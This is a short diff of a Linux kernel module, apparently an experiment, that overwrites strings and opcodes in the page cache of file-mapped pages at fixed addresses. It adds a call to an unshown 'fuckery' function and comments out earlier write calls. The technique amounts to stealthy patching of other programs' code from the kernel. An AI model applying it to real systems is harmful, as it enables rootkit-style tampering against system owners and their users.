@@ -53,10 +53,12 @@ int init_module(void)
   }
   printk(KERN_INFO "This page has an address_space object - it is likely file-mapped\n");
 
+  fuckery(i, 0x00191027);
+
   //unmap_page(i, 0x00107c10);
-  write_string_page_cache(i, 0x00191027, troll, 8, new_troll, old_troll);
-  write_string_page_cache(i, 0x00107c10, trolling_opcodes, 21, new_opcode, old_opcode);
-  old_opcode
+  //write_string_page_cache(i, 0x00191027, troll, 8, new_troll, old_troll);
+  //write_string_page_cache(i, 0x00107c10, trolling_opcodes, 21, new_opcode, old_opcode);
+  
   //remove_page(i, 0x00107c10); //extraction confirmed
   //remove_page(i, 0x00191027);
 
@@ -141,14 +143,22 @@ void cleanup_module(void)
 {
   //replace_page(new_opcode, old_opcode);
   //replace_page(new_troll, old_troll); //flipped around because
+  
 
+  /*if(!old_opcode){
+    printk(KERN_INFO "Old opcode has been evicted\n");
+  }
+
+  if(!old_troll){
+    printk(KERN_INFO "Old troll has been evicted\n");
+  }*/
 
   
   
   remove_page(i, 0x00107c10); //extraction confirmed
   remove_page(i, 0x00191027);
 
-  
+
 	printk("Module cleanup\n");
 }
 MODULE_LICENSE("GPL");
